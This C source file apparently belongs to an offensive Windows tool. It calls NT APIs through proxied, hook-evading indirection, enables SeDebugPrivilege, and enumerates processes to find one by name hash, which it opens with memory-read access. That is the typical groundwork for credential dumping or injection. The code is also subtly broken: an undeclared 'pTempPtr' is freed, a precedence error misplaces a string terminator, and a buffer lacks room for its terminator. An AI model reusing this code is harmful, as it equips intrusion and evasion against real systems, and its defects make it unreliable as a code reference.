#include "Common.h"

VOID AddWin32uToIat() {

    WCHAR szPath[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, NULL, szPath);
}

BOOL FormatUnicodeString(_In_ CONST UNICODE_STRING* pUnicodeString, _Out_ PWCHAR* ppszWideString) {
    if (!pUnicodeString || !pUnicodeString->Buffer || !ppszWideString) {
        return FALSE;
    }
    
    if (pUnicodeString->Length < pUnicodeString->MaximumLength && pUnicodeString->Buffer[pUnicodeString->Length / sizeof(WCHAR)] == L'\0') {
        *ppszWideString = (PWCHAR)malloc(pUnicodeString->Length);
        if (!*ppszWideString) {
            return FALSE;
        }

        memcpy(*ppszWideString, pUnicodeString->Buffer, pUnicodeString->Length);
    } else {
        *ppszWideString = (PWCHAR)malloc(pUnicodeString->Length + sizeof(WCHAR));
        if (!*ppszWideString) {
            return FALSE;
        }

        memcpy(*ppszWideString, pUnicodeString->Buffer, pUnicodeString->Length);
        *ppszWideString[pUnicodeString->Length / sizeof(WCHAR)] = L'\0';
    }

    return TRUE;
}

BOOL SetSeDebugPrivilege() {
    HANDLE              hToken              =  NULL;
    BOOL                bHasChecked         =  FALSE,
            bResult             =  FALSE;
    PTOKEN_PRIVILEGES   pTokenPrivileges    =  NULL;
    TOKEN_ELEVATION     tokenElevation      = {NULL};
    DWORD               tokenElevationSize  = sizeof(TOKEN_ELEVATION),
            tokenPrivsSize      = 0;

    Instance->Win32.Api.NtOpenProcessToken.ProxyCall(
            U_PTR(NtCurrentProcess()),
            U_PTR((TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES)),
            U_PTR(&hToken)
    );

    if (!hToken) {
        return bResult;
    }

    Instance->Win32.Api.NtQueryInformationToken.ProxyCall(
            U_PTR(hToken),
            U_PTR(TokenElevation),
            U_PTR(&tokenElevation),
            U_PTR(sizeof(tokenElevation)),
            U_PTR(&tokenElevationSize)
    );

    if (!tokenElevation.TokenIsElevated) {
        printf("[!] Administrative privileges required\n");
        return bResult;
    }

    Instance->Win32.Api.NtQueryInformationToken.ProxyCall(
            U_PTR(hToken),
            U_PTR(TokenPrivileges),
            U_PTR(NULL),
            U_PTR(NULL),
            U_PTR(&tokenPrivsSize)
    );

    if (!tokenPrivsSize) {
        printf("[!] NtQueryInformationToken call failed\n");
        return bResult;
    }


    pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(sizeof(BYTE[tokenPrivsSize]));
    if (!pTokenPrivileges) {
        printf("[!] Failed to allocate memory for TOKEN_PRIVILEGES\n");
        return bResult;
    }

    CHECK:
    Instance->Win32.Api.NtQueryInformationToken.ProxyCall(
            U_PTR(hToken),
            U_PTR(TokenPrivileges),
            U_PTR(pTokenPrivileges),
            U_PTR(tokenPrivsSize),
            U_PTR(&tokenPrivsSize)
    );

    if (!pTokenPrivileges->PrivilegeCount) {
        printf("[!] NtQueryInformationToken call failed\n");
        goto EXIT;
    }

    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; ++i) {
        if (pTokenPrivileges->Privileges[i].Luid.LowPart == 20) {
            if (!(pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)) {
                pTokenPrivileges->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;

                Instance->Win32.Api.NtAdjustPrivilegesToken.ProxyCall(
                        U_PTR(hToken),
                        U_PTR(FALSE),
                        U_PTR(pTokenPrivileges),
                        U_PTR(tokenPrivsSize),
                        U_PTR(NULL),
                        U_PTR(NULL)
                );

                if (bHasChecked) {
                    printf("[!] NtAdjustPrivilegesToken call failed\n");
                    goto EXIT;
                } else {
                    bHasChecked = TRUE;
                    goto CHECK;
                }
            } else {
                bResult = TRUE;
                goto EXIT;
            }
        }
    }

    EXIT:
    free(pTokenPrivileges);
    return bResult;
}

BOOL EnumerateProcesses(_Out_ PSYSTEM_PROCESS_INFORMATION* ppSystemProcessInformation) {
    ULONG   ulArrayLength   = 0;

    if (!ppSystemProcessInformation) {
        return FALSE;
    }

    Instance->Win32.Api.NtQuerySystemInformation.ProxyCall(
            U_PTR(SystemProcessInformation),
            U_PTR(NULL),
            U_PTR(NULL),
            U_PTR(&ulArrayLength)
    );

    if (!ulArrayLength) {
        printf("[!] NtQuerySystemInformation call failed\n");
        return FALSE;
    }

    *ppSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)malloc(ulArrayLength + 2048);
    if (!*ppSystemProcessInformation) {
        printf("[!] Failed to allocate memory for SYSTEM_PROCESS_INFORMATION\n");
        return FALSE;
    }

    Instance->Win32.Api.NtQuerySystemInformation.ProxyCall(
            U_PTR(SystemProcessInformation),
            U_PTR(*ppSystemProcessInformation),
            U_PTR(ulArrayLength),
            U_PTR(NULL)
    );

    if (!(*ppSystemProcessInformation)->NextEntryOffset) {
        printf("[!] NtQuerySystemInformation call failed\n");
        return FALSE;
    }

    return TRUE;
}

BOOL GetProcessHandle(_In_ ULONG ulProcessHash, _Out_ PDWORD pdwProcessID, _Out_ PHANDLE phProcess) {
    ULONG                           ulArrayLength               = 0;
    BOOL                            bResult                     = FALSE;
    PVOID*                          ppTempPtr                   = NULL;
    PSYSTEM_PROCESS_INFORMATION     pSystemProcessInformation   = NULL;
    OBJECT_ATTRIBUTES               objectAttributes            = {NULL};
    CLIENT_ID                       clientId                    = {NULL};


    if (!ulProcessHash || !pdwProcessID || !phProcess) {
        return bResult;
    }


    //ppTempPtr = C_PTR(pSystemProcessInformation);
    if (!EnumerateProcesses(&pSystemProcessInformation)) {
        goto EXIT;
    }
    //pTempPtr = C_PTR(pSystemProcessInformation);

    while(pSystemProcessInformation->NextEntryOffset) {
        if (!pSystemProcessInformation->ImageName.Length || pSystemProcessInformation->ImageName.Length >= MAX_PATH) {
            goto NEXT;
        }

        if (HashStringW(pSystemProcessInformation->ImageName.Buffer) == ulProcessHash) {
            *pdwProcessID = (DWORD)pSystemProcessInformation->UniqueProcessId;

            clientId.UniqueProcess = pSystemProcessInformation->UniqueProcessId;
            clientId.UniqueThread  = 0;
            Instance->Win32.Api.NtOpenProcess.ProxyCall(
                    U_PTR(phProcess),
                    U_PTR((PROCESS_QUERY_INFORMATION|PROCESS_VM_READ)),
                    U_PTR(&objectAttributes),
                    U_PTR(&clientId)
                    );

            if (!*phProcess) {
                printf("[!] NtOpenProcess call failed\n");
                goto EXIT;
            }
            bResult = TRUE;
            break;
        }

        NEXT:
        pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)(U_PTR(pSystemProcessInformation) + pSystemProcessInformation->NextEntryOffset);
    }

    EXIT:
    if (*pTempPtr) {
        free(pTempPtr);
    }
    return bResult;
}